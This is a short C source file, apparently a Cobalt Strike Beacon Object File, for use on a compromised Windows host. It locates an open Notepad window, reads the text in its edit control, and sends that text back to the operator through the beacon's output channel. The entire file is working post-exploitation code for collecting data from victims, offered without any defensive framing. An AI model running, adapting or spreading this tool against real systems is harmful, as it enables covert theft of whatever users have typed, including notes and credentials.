#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT WINUSERAPI HWND WINAPI USER32$FindWindowExA (HWND, HWND, LPCSTR, LPCSTR);
DECLSPEC_IMPORT WINUSERAPI LRESULT WINAPI USER32$SendMessageA (HWND, UINT, WPARAM, LPARAM);
DECLSPEC_IMPORT WINBASEAPI void *__cdecl MSVCRT$calloc(size_t num, size_t size);  

void go(){

    char *buffer;
    HWND noteHwnd = NULL;
    HWND editHwnd = NULL;
    int len = 30000;

    noteHwnd = USER32$FindWindowExA(NULL, NULL, "Notepad", NULL);
    if (noteHwnd)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Found Window %x\n", noteHwnd);
        editHwnd = USER32$FindWindowExA(noteHwnd, NULL, "Edit", NULL);
        if (editHwnd)
        {
            buffer = (char*)MSVCRT$calloc(1, len+1);
            USER32$SendMessageA(editHwnd, WM_GETTEXT,len,(LPARAM)buffer);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] %s\n", buffer);
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to find Notepad Window\n");
    }
}
